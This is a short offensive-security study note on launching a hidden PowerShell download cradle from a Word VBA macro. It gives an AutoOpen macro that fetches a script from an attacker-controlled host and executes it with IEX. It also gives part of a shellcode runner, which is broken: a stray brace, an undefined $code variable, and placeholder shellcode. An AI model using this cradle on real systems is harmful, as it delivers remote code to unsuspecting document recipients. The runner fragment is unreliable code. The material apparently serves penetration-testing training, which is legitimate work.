# 02.01 PowerShell Download Cradle from VBA

> Listing 62 · Shell to PowerShell IEX one-liner

## Overview

VBA's Shell function can spawn PowerShell with vbHide to suppress the window. Use a download cradle to fetch and IEX a remote PowerShell script. This avoids embedding shellcode directly in the macro.

## Steps

* **Use Shell()** with vbHide to keep the process hidden.
* **Download and execute** — `DownloadString` + `IEX` to run a hosted PowerShell script.
* **Host the stage** — Apache or Python HTTP server on Kali.

## Commands

### VBA download cradle (Listing 62)

```cmd
Sub AutoOpen()
    Shell "powershell (New-Object System.Net.WebClient).DownloadString('http://<LHOST>/run.ps1') | IEX", vbHide
End Sub
```

### PowerShell shellcode runner (run.ps1)

```powershell
# run.ps1 — hosted on attacker; fetched by the VBA cradle above

}

Add-Type -TypeDefinition $code -Language CSharp

$buf = [Byte[]] (0xfc, 0x48, 0x83 <# ... paste msfvenom -f ps1 output #> )
```
